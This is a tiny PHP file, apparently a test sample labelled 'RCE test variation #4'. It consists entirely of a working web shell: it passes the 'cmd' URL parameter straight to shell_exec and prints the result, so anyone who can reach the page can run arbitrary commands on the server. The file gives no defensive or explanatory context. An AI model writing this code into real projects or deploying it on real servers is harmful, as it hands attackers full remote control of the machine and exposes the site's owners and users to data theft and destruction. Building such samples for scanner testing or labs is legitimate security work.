<?php
// RCE test variation #4
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>